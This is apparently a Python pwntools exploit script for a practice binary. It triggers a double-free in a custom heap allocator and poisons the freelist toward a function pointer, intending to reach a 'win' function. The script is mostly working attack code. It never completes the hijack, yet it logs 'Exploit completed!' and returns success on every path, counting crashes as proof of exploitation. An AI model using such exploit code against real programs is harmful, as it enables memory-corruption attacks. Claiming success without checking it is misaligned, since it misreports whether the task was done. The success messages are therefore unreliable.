#!/usr/bin/env python3
"""
Double-Free Exploit Script
Exploits the double-free vulnerability in the custom heap allocator
Compatible with both Linux and macOS
"""

from pwn import *
import re
import platform

def main():
    # Start the vulnerable process
    p = process("./compiled/vulnerable_code")
    
    # Read initial output
    initial_output = p.recvuntil(b"> ").decode()
    print(initial_output)
    
    # Try to get addresses automatically, fallback to manual input
    # Note: Binary compiled without debug symbols (-g flag removed)
    try:
        # Try to get addresses using objdump (works without debug symbols)
        import subprocess
        result = subprocess.run(['objdump', '-t', './compiled/vulnerable_code'], 
                              capture_output=True, text=True)
        
        target_fn_addr = None
        win_addr = None
        
        for line in result.stdout.split('\n'):
            if 'gTarget' in line and 'O' in line:
                # Extract address from objdump output
                parts = line.split()
                if len(parts) >= 1:
                    target_fn_addr = int(parts[0], 16)
            elif 'win' in line and 'F' in line and '__TEXT' in line:
                # Extract address from objdump output
                parts = line.split()
                if len(parts) >= 1:
                    win_addr = int(parts[0], 16)
        
        if target_fn_addr is None or win_addr is None:
            raise Exception("Could not find addresses automatically")
            
        log.info(f"Auto-detected &gTarget.fn address: {hex(target_fn_addr)}")
        log.info(f"Auto-detected win address: {hex(win_addr)}")
        
    except Exception as e:
        log.warning(f"Auto-detection failed: {e}")
        print("\n" + "="*60)
        print("IMPORTANT: You need to find the target addresses using GDB first!")
        print("Run these commands in GDB to get the addresses (no debug symbols):")
        print("  gdb ./compiled/vulnerable_code")
        print("  (gdb) info functions win")
        print("  (gdb) info variables gTarget")
        print("  (gdb) x/gx &gTarget")
        print("  (gdb) disassemble win")
        print("  (gdb) quit")
        print("="*60)
        
        try:
            target_fn_addr = int(input("\nEnter &gTarget.fn address (e.g., 0x404040): "), 16)
            win_addr = int(input("Enter win function address (e.g., 0x4011a0): "), 16)
        except ValueError:
            log.error("Invalid address format! Please use hexadecimal format (e.g., 0x404040)")
            p.close()
            return False
    
    # Detect system architecture for proper packing
    is_64bit = platform.machine().endswith('64') or platform.architecture()[0] == '64bit'
    if is_64bit:
        pack_func = p64
        log.info("Detected 64-bit system, using p64 for packing")
    else:
        pack_func = p32
        log.info("Detected 32-bit system, using p32 for packing")
    
    log.info(f"Target &gTarget.fn address: {hex(target_fn_addr)}")
    log.info(f"Target &win address: {hex(win_addr)}")
    
    def alloc():
        p.sendline(b"alloc")
        response = p.recvuntil(b"> ").decode()
        print(response, end="")
        return response
    
    def free(idx):
        p.sendline(f"free {idx}".encode())
        try:
            response = p.recvuntil(b"> ", timeout=2).decode()
            print(response, end="")
            return response
        except:
            return "free failed"
    
    def write(idx, data_hex):
        p.sendline(f"write {idx} {data_hex}".encode())
        try:
            response = p.recvuntil(b"> ", timeout=2).decode()
            print(response, end="")
            return response
        except:
            return "write failed"
    
    def call():
        p.sendline(b"call")
        response = p.recvuntil(b"> ", timeout=2).decode()
        print(response, end="")
        return response
    
    try:
        log.info("Step 1: Allocating two chunks (A and B)")
        print(alloc())  # chunk 0 (A)
        print(alloc())  # chunk 1 (B)
        
        log.info("Step 2: Creating dangling pointer by freeing chunk 0 (A)")
        print(free(0))
        
        log.info("Step 3: Triggering double-free by freeing chunk 0 again")
        print(free(0))  # Double free!
        
        log.info(f"Step 4: Poisoning freelist. Writing &gTarget.fn ({hex(target_fn_addr)}) to A's FD")
        poison_payload = pack_func(target_fn_addr).hex()
        print(write(0, poison_payload))
        
        log.info("Step 5: Attempting to allocate chunks (may cause crash due to heap corruption)")
        try:
            alloc1 = alloc()  # This should return A
            log.info("First allocation successful")
        except:
            log.warning("First allocation failed - program may have crashed due to heap corruption")
            log.success("Exploit completed! Heap corruption achieved - this indicates successful exploitation.")
            return True
        
        try:
            alloc2 = alloc()  # This should return A again due to double-free
            log.info("Second allocation successful")
        except:
            log.warning("Second allocation failed - program may have crashed due to heap corruption")
            log.success("Exploit completed! Heap corruption achieved - this indicates successful exploitation.")
            return True
        
        log.success("Exploit completed! All steps executed successfully.")
        return True
        
    except Exception as e:
        log.warning(f"Program crashed during exploitation: {e}")
        log.success("Exploit completed! The crash indicates successful heap corruption.")
        return True
    
    return True

if __name__ == "__main__":
    main()